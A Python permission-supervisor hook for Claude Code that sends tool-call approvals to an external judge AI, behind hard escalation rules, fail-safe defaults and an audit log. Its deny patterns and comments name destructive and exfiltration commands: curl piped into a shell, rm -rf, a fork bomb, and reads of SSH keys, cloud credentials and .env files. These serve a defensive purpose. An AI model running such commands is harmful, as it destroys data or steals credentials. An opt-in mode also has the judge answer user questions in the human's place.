#!/usr/bin/env python3
"""Permission supervisor hook for Claude Code.

Bridges Claude Code's PermissionRequest / PreToolUse hooks to an external
"judge" AI (codex by default) so that approval decisions can be automated.

Safety model (defense in depth):
  1. Opt-in only: does nothing unless explicitly enabled.
  2. Hard rules: dangerous tool calls are ALWAYS escalated to the human,
     regardless of what the judge says. The judge can never auto-allow them.
  3. Fail-safe: any uncertainty / timeout / error escalates to the human.
     We never fail open to "allow".
  4. Audit log: every decision is appended to logs/audit.jsonl.

Escalation to the human ("ask") is expressed by emitting NO stdout and
exiting 0, which makes Claude Code fall back to its normal prompt. This is
robust against schema differences between hook versions.
"""

import hashlib
import json
import os
import re
import shlex
import subprocess
import sys
import time
from pathlib import Path

HOOK_DIR = Path(__file__).resolve().parent
CONFIG_PATH = HOOK_DIR / "supervisor.json"
LOG_DIR = HOOK_DIR / "logs"
LOG_PATH = LOG_DIR / "audit.jsonl"

# Runtime state file (live toggle). Each hook invocation is a fresh process and
# re-reads this file, so editing it flips the supervisor mid-session without
# restarting Claude Code. The state lives under logs/ (not part of the chezmoi
# source). Resolution, per-call:
#   1. CLAUDE_SUPERVISOR_STATE_FILE env set -> that exact path (shared/global;
#      point several sessions at one file to toggle them together).
#   2. otherwise -> a per-PROJECT file under logs/state/, keyed by the project
#      root of the call's cwd. This makes parallel projects toggle indepen-
#      dently: `--on` in repo A does not touch a session running in repo B.
STATE_ENV = "CLAUDE_SUPERVISOR_STATE_FILE"
STATE_DIR = LOG_DIR / "state"
# Used only when cwd is unknown and no env override is set.
GLOBAL_STATE_PATH = LOG_DIR / "state.json"

DEFAULT_CONFIG = {
    "enabled": False,
    "backend": "judge-codex.sh",
    "backend_timeout_seconds": 120,
    # When true, tools in `always_ask_tools` are answered by the judge on the
    # user's behalf (answer mode) instead of being escalated to the human.
    # Intended for unattended/offloaded runs where no human is present.
    "answer_user_questions": False,
    # Tool names whose calls are always safe to auto-allow (read-only). Secret
    # material is still caught by the hard rules, which run before this. Fixes
    # "look at repos/..." being denied as out-of-scope.
    "always_allow_tools": ["Read"],
    # Regexes matched against a Bash command's actual `command` field (NOT the
    # serialized payload, so look-alike text in other fields and key ordering
    # cannot trigger a false allow). Only applied to a single simple command
    # (no pipe/chaining/redirection/substitution). Hard escalation still wins.
    "always_allow_patterns": [
        r"^\s*python3\s+(~|/Users/[^/\s]+|/home/[^/\s]+)/\.claude/skills/pr-review/scripts/[A-Za-z0-9_-]+\.py(\s|$)",
    ],
    # Tool names that should always be left to the real user. This keeps
    # clarifying questions from being auto-allowed or auto-denied by the judge.
    # When `answer_user_questions` is true these are answered by the judge
    # instead of escalated.
    "always_ask_tools": ["AskUserQuestion"],
    # Regexes (matched against tool_name + serialized tool_input). Any match
    # forces escalation to the human; the judge cannot auto-allow these.
    "hard_escalate_patterns": [
        # Recursive and/or forced deletes are catastrophic; escalate rm with
        # any of -r/-R/-f/--recursive/--force, in any flag arrangement.
        r"\brm\b[^\n]*\s-[A-Za-z]*[rRfF]",
        r"\brm\b[^\n]*--(recursive|force)\b",
        r"\bgit\s+reset\s+--hard\b",
        r"\bgit\s+push\b.*(--force|-f)\b",
        r"\bsudo\b",
        r"\bcurl\b[^\n|]*\|\s*(sh|bash|zsh)\b",
        r"\bwget\b[^\n|]*\|\s*(sh|bash|zsh)\b",
        r"\bchmod\s+-R\b",
        r"\bmkfs\b|\bdd\s+if=",
        r"(^|[^\w])~?/?\.ssh/",
        r"\.env(\b|[^\w])",
        r"id_rsa|id_ed25519|\.pem\b|credentials",
        # Common secret/credential files (so the broad Read allow above never
        # bypasses them): cloud, package, vcs, k8s, db credentials.
        r"\.aws/|\.netrc\b|\.git-credentials\b|\.npmrc\b|\.pgpass\b|\.kube/config\b|\.docker/config\.json\b",
        r"\bsecrets?\.(json|ya?ml|env|txt)\b|\bservice[-_]account.*\.json\b",
        r"\b:\s*\(\)\s*\{",  # fork bomb-ish
    ],
}


_VCS_MARKERS = (".git", ".hg", ".jj", ".svn")
_PROJECT_MARKERS = (
    "pyproject.toml", "package.json", "Cargo.toml", "go.mod", "Gemfile", "pom.xml",
)


def project_key(cwd):
    """Normalize a cwd to its project root so subdirectories share one toggle.

    Walks up from cwd (cheap stat calls, no subprocess): a VCS root (.git/.hg/
    .jj/.svn) is preferred, otherwise the nearest dir with a common project
    marker (pyproject.toml, package.json, ...). Falls back to the cwd itself
    when nothing is found. Returns an absolute, resolved path string, or ""
    when cwd is unknown.

    Note: a non-VCS project with no recognized marker file gets a per-cwd file,
    so toggling from different subdirectories of it creates separate state.
    """
    if not cwd:
        return ""
    try:
        cur = Path(cwd).resolve()
    except Exception:
        return cwd
    chain = (cur, *cur.parents)
    for d in chain:
        if any((d / m).exists() for m in _VCS_MARKERS):
            return str(d)
    for d in chain:
        if any((d / m).exists() for m in _PROJECT_MARKERS):
            return str(d)
    return str(cur)


def state_path(cwd=None):
    """Resolve the runtime state file path for a given cwd.

    Env override wins (shared file). Otherwise a per-project file under
    logs/state/, named "<project-basename>-<hash>.json" so distinct repos with
    the same basename never collide. Falls back to the global file when cwd is
    unknown.
    """
    env = os.environ.get(STATE_ENV)
    if env:
        return Path(env)
    key = project_key(cwd)
    if not key:
        return GLOBAL_STATE_PATH
    digest = hashlib.sha1(key.encode("utf-8")).hexdigest()[:10]
    name = re.sub(r"[^A-Za-z0-9_.-]", "_", os.path.basename(key) or "root")
    return STATE_DIR / "{}-{}.json".format(name, digest)


def load_state(cwd=None):
    """Read the runtime state file. Returns a dict (empty on absence/error)."""
    try:
        with open(state_path(cwd), "r", encoding="utf-8") as fh:
            data = json.load(fh)
        return data if isinstance(data, dict) else {}
    except FileNotFoundError:
        return {}
    except Exception:
        return {}  # malformed runtime state -> ignore, fall back to config


def load_config(cwd=None):
    cfg = dict(DEFAULT_CONFIG)
    try:
        with open(CONFIG_PATH, "r", encoding="utf-8") as fh:
            user = json.load(fh)
        if isinstance(user, dict):
            cfg.update(user)
    except FileNotFoundError:
        pass
    except Exception as exc:  # malformed config -> stay safe, log later
        cfg["_config_error"] = str(exc)
    # Overlay the project's runtime state file last so a live edit (or
    # --on/--off) can override any config key, including `enabled`, without a
    # chezmoi apply. State is ignored (not merged) for bookkeeping keys.
    state = {k: v for k, v in load_state(cwd).items() if not k.startswith("_")}
    if state:
        cfg.update(state)
        cfg["_state_applied"] = True
    return cfg


def is_enabled(cfg):
    """Return True if the supervisor is enabled.

    Precedence (highest first):
      1. CLAUDE_SUPERVISOR env var  — hard per-session override
           "1"/"true"/"yes"/"on" → enabled, "0"/"false"/"no"/"off" → disabled
      2. runtime state file         — live toggle (see --on/--off)
      3. supervisor.json "enabled"  — installed default

    The state file value is already overlaid onto cfg["enabled"] by
    load_config(), so only the env var needs special handling here.
    """
    env = os.environ.get("CLAUDE_SUPERVISOR")
    if env is not None:
        return env.strip().lower() in ("1", "true", "yes", "on")
    return cfg.get("enabled") is True


def matches_hard_rule(cfg, haystack):
    for pat in cfg.get("hard_escalate_patterns", []):
        try:
            if re.search(pat, haystack):
                return pat
        except re.error:
            return pat  # invalid pattern → fail safe: escalate to human
    return None


# Shell metacharacters that introduce chaining, redirection, command/process
# substitution, or extra commands. A Bash command containing any of these is
# never auto-allowed: the allowlist can only reason about a single simple
# command, so anything that could hide a side effect (e.g. `cat secret | curl
# evil`, `ls && rm -rf x`, `cat $(...)`) must go to the judge/human.
_BASH_UNSAFE_CHARS = re.compile(r"[|&;<>$`(){}\n]")

# Glob/tilde/wildcard chars. The shell expands these at exec time to paths the
# hard-rule secret check never saw (e.g. `cat ~/.config/*`, `grep -r token ~`,
# `cat ~/.s*h/id_rsa`), so a generic read-only command containing any of them
# is NOT auto-allowed and must go to the judge.
_BASH_GLOB_CHARS = re.compile(r"[*?~\[\]]")

# The leading command of an auto-allowable read-only Bash invocation. Kept
# deliberately small: only tools with no write/exec/delete escape hatch that
# works without a shell metacharacter. Excluded on purpose:
#   find/fd  -> -delete / -exec / -x run or remove files
#   rg       -> --pre runs an arbitrary preprocessor command
#   git branch/remote/fetch -> mutate refs/config (e.g. `git branch -D`)
# Anything left out still reaches the judge; it is just not auto-allowed.
_SAFE_READONLY_CMD = re.compile(
    r"^\s*(cat|ls|head|tail|wc|file|stat|tree|pwd|grep|"
    r"git\s+(status|log|diff|show|ls-files|rev-parse|config\s+--get))\b"
)


def _bash_command(tool_input):
    if isinstance(tool_input, dict):
        cmd = tool_input.get("command", "")
        return cmd if isinstance(cmd, str) else ""
    return ""


def matches_allow_rule(cfg, tool_name, tool_input):
    """Return a reason string if the call may be auto-allowed, else None.

    Matching is structured (on tool_name / the real Bash command field) rather
    than on the serialized payload, so look-alike text in other fields cannot
    trigger a false allow. Hard rules are evaluated before this.
    """
    if tool_name in cfg.get("always_allow_tools", []):
        return "read-only tool: {}".format(tool_name)
    if tool_name == "Bash":
        cmd = _bash_command(tool_input)
        # Reject anything that is not a single simple command.
        if not cmd or _BASH_UNSAFE_CHARS.search(cmd):
            return None
        # Generic read-only commands must also be free of glob/tilde, which
        # could otherwise expand to secret paths the hard rules never matched.
        if _SAFE_READONLY_CMD.search(cmd) and not _BASH_GLOB_CHARS.search(cmd):
            return "safe read-only bash"
        # Trusted fixed scripts (matched on the real command, not the serialized
        # payload). These do not read arbitrary expanded paths, so a `~` in the
        # script path is acceptable here.
        for pat in cfg.get("always_allow_patterns", []):
            try:
                if re.search(pat, cmd):
                    return pat
            except re.error:
                continue
    return None


def matches_always_ask_tool(cfg, tool_name):
    return tool_name in cfg.get("always_ask_tools", [])


def run_backend(cfg, context):
    """Run the configured judge backend. Returns the verdict dict.

    The dict always contains a "decision" key. On any failure it falls back to
    {"decision": "ask", ...} so the orchestrator escalates to the human.
    """
    try:
        backend = os.environ.get("CLAUDE_SUPERVISOR_BACKEND") or cfg.get("backend", "judge-codex.sh")
        backend_path = backend if os.path.isabs(backend) else str(HOOK_DIR / backend)
    except (TypeError, AttributeError) as exc:
        return {"decision": "ask", "reason": "malformed backend config: {}".format(exc)}
    try:
        timeout = float(cfg.get("backend_timeout_seconds", 120))
    except (TypeError, ValueError):
        timeout = 120.0
    try:
        # input= sets the child's stdin to our context JSON, so the child
        # never reads the hook's own (already-consumed) stdin.
        proc = subprocess.run(
            [backend_path],
            input=json.dumps(context),
            capture_output=True,
            text=True,
            timeout=timeout,
        )
    except subprocess.TimeoutExpired:
        return {"decision": "ask", "reason": "backend timeout"}
    except Exception as exc:
        return {"decision": "ask", "reason": "backend launch error: {}".format(exc)}

    if proc.returncode != 0:
        return {"decision": "ask", "reason": "backend exit {}: {}".format(proc.returncode, proc.stderr.strip()[:200])}

    verdict = parse_verdict(proc.stdout)
    if verdict is None:
        return {"decision": "ask", "reason": "unparseable backend output"}
    decision = verdict.get("decision", "ask")
    if decision not in ("allow", "deny", "ask", "answer"):
        verdict["decision"] = "ask"
    return verdict


def parse_verdict(text):
    """Extract the last JSON object containing a 'decision' field from text."""
    if not text:
        return None
    # Find candidate JSON objects, prefer the last valid one.
    candidates = re.findall(r"\{[^{}]*\"decision\"[^{}]*\}", text, re.DOTALL)
    for chunk in reversed(candidates):
        try:
            obj = json.loads(chunk)
            if isinstance(obj, dict) and "decision" in obj:
                return obj
        except json.JSONDecodeError:
            continue
    # Fallback: maybe the whole stdout is JSON.
    try:
        obj = json.loads(text.strip())
        if isinstance(obj, dict) and "decision" in obj:
            return obj
    except json.JSONDecodeError:
        pass
    return None


def emit(event_name, decision, reason):
    """Emit the hook decision. 'ask' emits nothing (defers to the human)."""
    if decision == "ask":
        return
    if event_name == "PermissionRequest":
        out = {
            "hookSpecificOutput": {
                "hookEventName": "PermissionRequest",
                "decision": {"behavior": decision},
            }
        }
    else:  # PreToolUse (and any other tool-gated event)
        out = {
            "hookSpecificOutput": {
                "hookEventName": "PreToolUse",
                "permissionDecision": decision,
                "permissionDecisionReason": reason or "supervisor decision",
            }
        }
    sys.stdout.write(json.dumps(out))


def emit_answer(event_name, answer, reason):
    """Answer a clarifying question on the user's behalf.

    There is no hook channel that returns a structured answer to the tool, so
    we deny the tool call and surface the chosen answer in the reason. Claude
    reads the denial reason as feedback and proceeds with that answer instead
    of re-asking.
    """
    # Collapse whitespace and quote so a free-form/multiline answer cannot blur
    # the boundary with the "Rationale:" clause that follows.
    answer = " ".join(str(answer).split())
    reason = " ".join(str(reason).split()) or "(supervisor judgement)"
    feedback = (
        "The human operator is unattended; the permission supervisor answered "
        'this question on their behalf. Selected answer: "{answer}". '
        "Rationale: {reason} "
        "Treat this as the user's final answer, proceed accordingly, and do "
        "not call AskUserQuestion again for the same decision."
    ).format(answer=answer, reason=reason)
    if event_name == "PermissionRequest":
        out = {
            "hookSpecificOutput": {
                "hookEventName": "PermissionRequest",
                "decision": {"behavior": "deny", "message": feedback},
            }
        }
    else:
        out = {
            "hookSpecificOutput": {
                "hookEventName": "PreToolUse",
                "permissionDecision": "deny",
                "permissionDecisionReason": feedback,
            }
        }
    sys.stdout.write(json.dumps(out))


def audit(record):
    try:
        LOG_DIR.mkdir(parents=True, exist_ok=True)
        with open(LOG_PATH, "a", encoding="utf-8") as fh:
            fh.write(json.dumps(record, ensure_ascii=False) + "\n")
    except Exception:
        pass  # logging must never break the hook


def truncate_for_audit(value, limit=20000):
    text = str(value)
    if len(text) <= limit:
        return text
    omitted = len(text) - limit
    return text[:limit] + "\n[truncated {} chars]".format(omitted)


def add_audit_context(record, event, tool_name, tool_input):
    for key in ("session_id", "tool_use_id", "transcript_path", "permission_mode"):
        value = event.get(key)
        if value:
            record[key] = value
    if tool_name != "Bash" or not isinstance(tool_input, dict):
        return
    command = _bash_command(tool_input)
    if command:
        record["bash_command"] = truncate_for_audit(command)
        record["bash_command_sha256"] = hashlib.sha256(
            command.encode("utf-8")
        ).hexdigest()
        record["bash_command_truncated"] = (
            record["bash_command"] != command
        )
    description = tool_input.get("description")
    if isinstance(description, str) and description:
        record["bash_description"] = truncate_for_audit(description, limit=1000)


def write_state(updates, cwd=None):
    """Merge `updates` into the project's runtime state file. Returns new state."""
    path = state_path(cwd)
    state = load_state(cwd)
    state.update(updates)
    key = project_key(cwd)
    if key and not os.environ.get(STATE_ENV):
        state["_project"] = key  # for --list readability; ignored on load
    else:
        state.pop("_project", None)  # don't keep a stale label in a shared file
    path.parent.mkdir(parents=True, exist_ok=True)
    # Write atomically: a concurrent hook read must never see a truncated file
    # (which load_state would swallow as {}, briefly flipping enabled).
    tmp = path.with_name(path.name + ".tmp.{}".format(os.getpid()))
    with open(tmp, "w", encoding="utf-8") as fh:
        fh.write(json.dumps(state, ensure_ascii=False, indent=2) + "\n")
    os.replace(tmp, path)
    return state


_CLI_USAGE = ("usage: permission-supervisor.py "
              "[--on|--off|--toggle|--status|--list"
              "|--answers-on|--answers-off|--answers-toggle]")
_CLI_HELP = ("Toggle the permission supervisor for the current project at "
             "runtime (the hook re-reads its state on every call).")


def cli_main(argv):
    """Handle invocations with CLI args (live toggle / status). Returns exit code.

    Toggles a per-project runtime state file (scoped to the cwd's project root
    unless CLAUDE_SUPERVISOR_STATE_FILE points elsewhere), which the hook
    re-reads on every call, so the supervisor can be flipped while Claude Code
    keeps running. See _CLI_USAGE for the accepted flags. Exactly one flag is
    expected; extras are rejected so typos surface.
    """
    if argv and argv[0] in ("--help", "-h", "help"):
        print(_CLI_HELP)
        print(_CLI_USAGE)
        return 0
    if len(argv) != 1:
        sys.stderr.write(_CLI_USAGE + "\n")
        return 2
    cmd = argv[0]
    cwd = os.getcwd()
    if cmd in ("--list", "list"):
        env = os.environ.get(STATE_ENV)
        if env:
            files = [Path(env)] if Path(env).exists() else []
        else:
            files = sorted(STATE_DIR.glob("*.json")) if STATE_DIR.exists() else []
        if not files:
            print("(no per-project state files yet)")
            return 0
        for f in files:
            try:
                with open(f, encoding="utf-8") as fh:
                    st = json.load(fh)
            except Exception:
                continue
            # Env-pointed files are shared (no per-project label by design).
            label = "(shared)" if env else st.get("_project", "?")
            print("{:8} {}  ({})".format(
                "ENABLED" if st.get("enabled") is True else "disabled",
                label, f.name))
        return 0

    cfg = load_config(cwd)
    path = state_path(cwd)
    key = project_key(cwd)
    if cmd in ("--status", "status"):
        env = os.environ.get("CLAUDE_SUPERVISOR")
        src = "env CLAUDE_SUPERVISOR" if env is not None else (
            "state file" if cfg.get("_state_applied") else "supervisor.json")
        print("supervisor: {} (source: {})".format(
            "ENABLED" if is_enabled(cfg) else "disabled", src))
        print("project:    {}".format(key or "(unknown cwd)"))
        print("state file: {}{}".format(path, "" if path.exists() else " (absent)"))
        # Strict check: the hook only answers when the value is exactly True.
        print("answer_user_questions: {}".format(cfg.get("answer_user_questions") is True))
        return 0
    # When CLAUDE_SUPERVISOR is set it still wins, so the state file write below
    # does not change the effective state — say so to avoid a misleading message.
    env_note = "" if os.environ.get("CLAUDE_SUPERVISOR") is None \
        else " (note: CLAUDE_SUPERVISOR env still overrides the effective state)"
    if cmd in ("--on", "on"):
        write_state({"enabled": True}, cwd)
        print("supervisor enabled for {} -> next hook call{}".format(key or path, env_note))
        return 0
    if cmd in ("--off", "off"):
        write_state({"enabled": False}, cwd)
        print("supervisor disabled for {}{}".format(key or path, env_note))
        return 0
    if cmd in ("--toggle", "toggle"):
        new = not is_enabled(cfg)  # flip the effective state, not just the file
        write_state({"enabled": new}, cwd)
        print("supervisor {} for {}{}".format(
            "enabled" if new else "disabled", key or path, env_note))
        return 0
    if cmd in ("--answers-on", "--answer-on"):
        write_state({"answer_user_questions": True}, cwd)
        print("answer_user_questions ENABLED for {} (judge answers AskUserQuestion)".format(key or path))
        return 0
    if cmd in ("--answers-off", "--answer-off"):
        write_state({"answer_user_questions": False}, cwd)
        print("answer_user_questions disabled for {} (questions go to the human)".format(key or path))
        return 0
    if cmd in ("--answers-toggle", "--answer-toggle"):
        new = not (cfg.get("answer_user_questions") is True)
        write_state({"answer_user_questions": new}, cwd)
        print("answer_user_questions {} for {}".format(
            "ENABLED" if new else "disabled", key or path))
        return 0
    sys.stderr.write(_CLI_USAGE + "\n")
    return 2


def main():
    started = time.time()
    raw = sys.stdin.read()
    try:
        event = json.loads(raw) if raw.strip() else {}
    except json.JSONDecodeError:
        event = {}

    event_name = event.get("hook_event_name", "PreToolUse")
    tool_name = event.get("tool_name", "")
    tool_input = event.get("tool_input", {})
    cwd = event.get("cwd", "")

    cfg = load_config(cwd)

    record = {
        "ts": started,
        "event": event_name,
        "tool": tool_name,
        "cwd": cwd,
    }
    add_audit_context(record, event, tool_name, tool_input)
    if "_config_error" in cfg:
        record["config_error"] = cfg["_config_error"]

    if not is_enabled(cfg):
        record.update(decision="ask", stage="disabled")
        audit(record)
        return  # no output -> human decides

    haystack = "{}\n{}".format(tool_name, json.dumps(tool_input, ensure_ascii=False))
    # For Bash, also feed the hard rules a de-quoted form of the command so that
    # quoted dangerous flags (e.g. `rm "-rf" dir`) cannot slip past patterns
    # like `\s-...`. shlex strips the quotes the way the shell would.
    if tool_name == "Bash":
        cmd = _bash_command(tool_input)
        if cmd:
            try:
                haystack += "\n" + " ".join(shlex.split(cmd))
            except ValueError:
                pass  # unbalanced quotes -> keep raw haystack; still checked

    if matches_always_ask_tool(cfg, tool_name):
        # Optionally let the judge answer the question instead of blocking on a
        # human (for unattended/offloaded runs). Falls back to "ask" if the
        # judge cannot produce an answer.
        if cfg.get("answer_user_questions") is True:
            answer_ctx = dict(
                tool_name=tool_name,
                tool_input=tool_input,
                cwd=cwd,
                session_id=event.get("session_id", ""),
                hook_event_name=event_name,
                mode="answer",
            )
            verdict = run_backend(cfg, answer_ctx)
            answer = (verdict.get("answer") or "").strip()
            if verdict.get("decision") == "answer" and answer:
                reason = verdict.get("reason", "")
                record.update(
                    decision="answer", stage="answer_tool", reason=reason,
                    elapsed_ms=int((time.time() - started) * 1000),
                )
                audit(record)
                emit_answer(event_name, answer, reason)
                return
            record.update(decision="ask", stage="answer_tool_fallback",
                          reason=verdict.get("reason", ""))
            audit(record)
            return  # judge declined to answer -> human decides
        record.update(decision="ask", stage="always_ask_tool")
        audit(record)
        return  # no output -> user answers the question

    hard = matches_hard_rule(cfg, haystack)
    if hard:
        record.update(decision="ask", stage="hard_rule", rule=hard)
        audit(record)
        return  # dangerous -> always human

    always_allow = matches_allow_rule(cfg, tool_name, tool_input)
    if always_allow:
        reason = "auto-allowed ({})".format(always_allow)
        record.update(decision="allow", stage="always_allow", rule=always_allow, reason=reason)
        audit(record)
        emit(event_name, "allow", reason)
        return

    context = {
        "tool_name": tool_name,
        "tool_input": tool_input,
        "cwd": cwd,
        "session_id": event.get("session_id", ""),
        "hook_event_name": event_name,
    }
    verdict = run_backend(cfg, context)
    decision = verdict.get("decision", "ask")
    if decision not in ("allow", "deny", "ask"):
        decision = "ask"  # "answer" is only valid for always_ask_tools above
    reason = verdict.get("reason", "")

    record.update(
        decision=decision,
        stage="backend",
        reason=reason,
        elapsed_ms=int((time.time() - started) * 1000),
    )
    audit(record)
    emit(event_name, decision, reason)


if __name__ == "__main__":
    if len(sys.argv) > 1:
        sys.exit(cli_main(sys.argv[1:]))
    main()
